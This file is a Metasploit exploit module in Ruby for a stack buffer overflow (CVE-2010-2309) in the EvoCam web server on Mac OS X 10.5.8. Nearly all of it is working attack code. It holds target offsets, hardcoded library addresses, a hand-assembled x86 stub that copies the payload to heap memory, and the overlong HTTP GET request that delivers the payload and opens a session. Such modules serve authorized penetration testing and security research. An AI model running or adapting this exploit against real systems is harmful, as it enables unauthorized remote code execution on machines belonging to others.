##
# $Id: evocam_webserver.rb 10617 2010-10-09 06:55:52Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'MacOS X EvoCam HTTP GET Buffer Overflow',
			'Description' => %q{
					This module exploits a stack buffer overflow in the web server provided with the EvoCam
				program for Mac OS X. We use Dino Dai Zovi's exec-from-heap technique to copy the payload
				from the non-executable stack segment to heap memory. Vulnerable versions include 3.6.6,
				3.6.7, and possibly earlier versions as well. EvoCam version 3.6.8 fixes the vulnerablity.
			},
			'Author'         =>
				[
					'Paul Harrington', # Original Exploit Author and MSF Module
					'dookie', # MSF Module Assistance
				],
			'Version'        => '$Revision: 10617 $',
			'Platform'       => 'osx',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2010-2309'],
					['OSVDB', '65043'],
					['URL', 'http://www.exploit-db.com/exploits/12835'],
				],
			'Payload'        =>
				{
					'Space' => 300,
					'BadChars' => "\x00\xff\x09\x0a\x0b\x0c\x0c\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Privileged'     => false,
			'Targets'        =>
				[
					[ 'Mac OS X 10.5.8 x86, EvoCam 3.6.6',
						{
							'Arch' => ARCH_X86,
							'Offset' => 1560,
							'Writable' => 0x8fe66448,
							'setjmp' => 0x8fe1cf38,
							'strdup' => 0x8fe210dc,
							'jmp_eax' => 0x8fe01041
						}
					],
					[ 'Mac OS X 10.5.8 x86, EvoCam 3.6.7',
						{
							'Arch' => ARCH_X86,
							'Offset' => 1308,
							'Writable' => 0x8fe66448,
							'setjmp' => 0x8fe1cf38,
							'strdup' => 0x8fe210dc,
							'jmp_eax' => 0x8fe01041
						}
					],

				],
			'DisclosureDate' => 'Jun 01 2010',
			'DefaultTarget'  => 1))

		register_options(
			[
				Opt::RPORT(8080),
			], self.class)
	end

	def make_exec_payload_from_heap_stub()
		frag0 =
			"\x90" + # nop
			"\x58" + # pop eax
			"\x61" + # popa
			"\xc3"   # ret

		frag1 =
			"\x90" +             # nop
			"\x58" +             # pop eax
			"\x89\xe0" +         # mov eax, esp
			"\x83\xc0\x0e" +     # add eax, byte +0xc
			"\x89\x44\x24\x08" + # mov [esp+0x8], eax
			"\xc3"               # ret

		setjmp = target['setjmp']
		writable = target['Writable']
		strdup = target['strdup']
		jmp_eax = target['jmp_eax']

		exec_payload_from_heap_stub =
			frag0 +
			[setjmp].pack('V') +
			[writable + 32, writable].pack("V2") +
			frag1 +
			"X" * 20 +
			[setjmp].pack('V') +
			[writable + 24, writable, strdup, jmp_eax].pack("V4") +
			"X" * 4
	end

	def exploit
		connect

		offset = target['Offset']

		buffer = "GET "
		buffer << rand_text_alpha_upper(offset)
		buffer << make_exec_payload_from_heap_stub()
		buffer << "\x90\x90"
		buffer << payload.encoded
		buffer << " HTTP/1.0\r\n\r\n"

		sock.put(buffer)
		sock.close

		handler()
		disconnect
	end

end
